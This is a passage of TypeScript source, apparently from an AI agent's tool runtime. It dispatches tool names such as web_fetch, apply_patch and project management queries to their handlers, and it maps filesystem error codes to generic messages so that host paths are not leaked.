        return await execApplyPatch(args, ctx);
      case 'create_branch':
        return await execCreateBranch(args, ctx);
      case 'update_tasks':
        return execUpdateTasks(args);
      case 'web_fetch':
        return await execWebFetch(args, ctx);
      case 'web_search':
        return await execWebSearch(args, ctx);
      case 'web_extract':
        return await execWebExtract(args, ctx);
      case 'web_crawl':
        return await execWebCrawl(args, ctx);
      case 'research':
        return await execResearch(args, ctx);
      case 'lsp':
        return await execLsp(args, ctx);
      case 'question':
        return await execQuestion(args, ctx);
      case 'skill':
        return execSkill(args, ctx);
      case 'project_status':
        return await execManagement(ctx, 'projectStatus', 'project_status', args);
      case 'work_items':
        return await execManagement(ctx, 'workItems', 'work_items', args);
      case 'sprint_status':
        return await execManagement(ctx, 'sprintStatus', 'sprint_status', args);
      case 'plans':
        return await execManagement(ctx, 'plans', 'plans', args);
      case 'insights':
        return await execManagement(ctx, 'insights', 'insights', args);
      case 'run_logs':
        return await execManagement(ctx, 'runLogs', 'run_logs', args);
      case 'list_agents':
        return await execManagement(ctx, 'listAgents', 'list_agents', args);
      case 'list_skills':
        return await execManagement(ctx, 'listSkills', 'list_skills', args);
      case 'sessions':
        return await execManagement(ctx, 'sessions', 'sessions', args);
      case 'verify':
        return await execManagement(ctx, 'verify', 'verify', args);
      case 'review':
        return await execManagement(ctx, 'review', 'review', args);
      default: {
        // Exhaustiveness guard: every NativeToolName is handled above.
        const exhaustive: never = name;
        return fail(`unhandled tool "${String(exhaustive)}"`);
      }
    }
  } catch (error) {
    // Never surface the raw message/stack: an fs error message can leak absolute
    // host paths. Map a known errno code to a generic phrase; redactSecrets is a
    // second layer (it does not strip ordinary paths).
    return fail(`tool "${name}" failed: ${genericErrorMessage(error)}`);
  }
}

/**
 * Builds a generic, host-path-free message from a thrown error's errno `code`,
 * never echoing the raw `error.message` (which can contain absolute paths).
 */
function genericErrorMessage(error: unknown): string {
  const code = (error as { code?: unknown }).code;
  if (typeof code === 'string') {
    switch (code) {
      case 'EACCES':
      case 'EPERM':
        return 'access denied';
      case 'ENOENT':
        return 'not found';
      case 'EISDIR':
        return 'is a directory';
      case 'ENOTDIR':
        return 'not a directory';
      case 'ELOOP':
        return 'symlink not permitted';
      case 'EMFILE':
      case 'ENFILE':
        return 'too many open files';
      default:
        return `tool failed (${code})`;
    }
  }
  return 'tool failed';
}
